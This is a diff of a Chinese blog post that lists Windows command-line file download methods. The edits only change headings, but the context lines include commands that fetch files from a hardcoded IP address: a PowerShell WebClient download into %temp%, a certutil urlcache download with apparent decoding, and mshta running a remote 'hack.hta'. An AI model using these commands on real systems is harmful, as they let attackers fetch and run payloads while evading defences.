@@ -9,7 +9,7 @@ title: 命令行文件下载-Windows篇(长期更新)
 
 [TOC]
 
-## 0x01 PoweShell
+# 0x01 PoweShell
 
 `win2003，winXP`不支持
 
@@ -35,9 +35,9 @@ powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/
 
 `%temp%`指当前登陆用户的临时目录
 
+---
 
-
-## 0x02 Certutil
+# 0x02 Certutil
 
 Path
 
@@ -64,7 +64,7 @@ certutil -urlcache -split -f http://47.92.194.173/test.bs4 %temp%\1.bs4&certutil
 
 ---
 
-## 0x03 bitsadmin
+# 0x03 bitsadmin
 
 Path:
 
@@ -125,7 +125,7 @@ bitsadmin已经在win7 win10 win2008 不可用
 
 ---
 
-## 0x04 mshta
+# 0x04 mshta
 
 mshta http://47.92.194.173/hack.hta 支持短网址
 
